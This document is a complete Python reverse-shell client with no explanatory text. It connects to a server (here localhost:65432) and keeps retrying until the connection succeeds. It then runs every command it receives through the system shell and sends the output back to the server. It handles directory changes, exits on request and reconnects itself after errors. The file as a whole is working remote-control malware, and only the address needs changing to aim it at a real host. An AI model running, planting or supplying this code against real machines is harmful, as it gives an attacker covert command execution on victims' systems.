import socket
import subprocess
import os
from time import sleep

# Address and port of the server to connect to
SERVER_ADDRESS = ('localhost', 65432)

def connect_to_server():
    """Establish and maintain connection to the server with retry logic."""

    sock = None
    while True:
        try:
            # Create TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(SERVER_ADDRESS)
            print(f"[+] Connected to server at {SERVER_ADDRESS}")
            break
        except socket.error as e:
            print(f"[-] Connection failed: {e}. Retrying in 2 seconds...")
            sleep(2)  # Wait before retrying

    # Main loop to receive and execute commands
    while True:
        try:
            command = sock.recv(1024).decode('utf-8')

            if not command:
                print("[-] Server closed the connection.")
                break

            if command.lower() == 'exit':
                print("[*] Server requested exit. Closing connection.")
                sock.close()
                break

            elif command.startswith('cd'):
                # Change directory
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    message = f"[+] Changed directory to {os.getcwd()}\n"
                except FileNotFoundError:
                    message = f"[-] Directory not found: {path}\n"
                sock.sendall(message.encode('utf-8'))

            else:
                # Execute shell command
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if output.strip() == '':
                    output = "[*] Command executed successfully, but no output.\n"
                sock.sendall(output.encode('utf-8'))

        except socket.error as e:
            print(f"[-] Socket error: {e}. Reconnecting...")
            sock.close()
            return connect_to_server()

if __name__ == "__main__":
    connect_to_server()
